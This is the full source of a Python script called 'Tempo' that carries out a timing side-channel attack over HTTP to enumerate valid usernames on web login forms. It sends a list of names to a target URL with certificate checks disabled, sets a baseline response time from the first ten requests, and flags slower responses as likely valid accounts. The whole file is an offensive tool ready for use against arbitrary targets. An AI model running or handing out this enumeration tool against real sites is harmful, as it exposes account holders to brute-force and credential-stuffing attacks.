#!/usr/bin/python
#
# Tempo - Side-Channel Timing Attack over HTTP
# Ismael Goncalves - https://sharingsec.blogspot.com
#
#
# TO-DO
# - implement average response time based on false requests 
# - implement logging
# - implement JSON support for requests
# - implement Examples
# - implement Sample Sucess Case
# - implement GET scheme
# - implement Results at the end instead of just VALID line 

try:
	import pycurl
except:
	print('Error importing pyCurl module')
	quit()
try:
    # python 3
    from urllib.parse import urlencode
except ImportError:
    # python 2
    from urllib import urlencode

import json
from StringIO import StringIO
import argparse

def parse_args():

	# Parsing CLI arguments
	sample = "Sample: python tempo.py -u users.txt -U username -t 'https://sometarget.com' -p 'password=randompass&Submit=ok'"
	parser = argparse.ArgumentParser(description='''Tempo - Timing Attack over HTTP 
	Written by: Ismael Goncalves - https://sharingsec.blogspot.com''', prog="tempo", epilog=sample,formatter_class=argparse.RawDescriptionHelpFormatter)

	parser.add_argument("-u", "--usrlist", help="File containing list of users", required=True) 
	parser.add_argument("-U", "--usrfield", help="Field from Form data identifying user" , required=True)
	parser.add_argument("-t", "--target", help="Target URL with protocol (e.g. https://sometarget.com)", required=True)
	parser.add_argument("-p", "--post", help="Form data without usrfield", required=True)
	parser.add_argument("-H", "--header", help="Additional header", action='append')
	args = parser.parse_args()

	return args

# User-Agent
ua = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)'

# Verbose
verbose = 0

def perform_curl(user_name,args):
	file = args.usrlist
        user_field = args.usrfield
        url = args.target
        post_data = args.post
        headersList = args.header

	c = pycurl.Curl()
	storage = StringIO()
        # concatenate username field at the end of the form data
        postfields = post_data + "&" + user_field + "=" + user_name

        c.setopt(c.SSL_VERIFYPEER, False)
       	c.setopt(c.SSL_VERIFYHOST, False)
	c.setopt(c.VERBOSE, verbose)
        c.setopt(c.USERAGENT, ua)
        c.setopt(c.URL, url)
        c.setopt(c.HTTPHEADER, headersList)
        c.setopt(c.POSTFIELDS, postfields)
        c.setopt(pycurl.WRITEFUNCTION, lambda x: None)
        c.setopt(c.HEADERFUNCTION, storage.write)
        c.perform()
	print user_name
	return format(c.getinfo(c.STARTTRANSFER_TIME) - c.getinfo(c.PRETRANSFER_TIME))

def exploit(args):
	# holds average time
	avg = 0.0
	# amount of transactions
	sum = 0.0
	# counter
	count = 0
	# limit to test invalid users
	limit = 10
	# target % time more - 1.15 for 15% 1.10 for 10%
	target = 1.150
	# times
	times = []

	file = args.usrlist

	with open(file) as f:
		for line in f:
			t = perform_curl(line.rstrip("\n"),args)
			print t
			count += 1
			sum += float(t)
			avg = (sum/count)
			times.append(float(t))
			if count >= limit:
				print 'test'
				print times
				print avg
				avg = (sum - min(times) - max(times)) / (limit -2)
				print avg
				break

		target = avg * target
		print "TARGET: " + str(target)

		# Resume testing...
		for line in f:
        	        t = perform_curl(line.rstrip("\n"),args)
			print t
			if float(t) >= target: print line + " Potential VALID"

def main():
	args = parse_args()
	exploit(args)

if __name__ == "__main__":
    main()
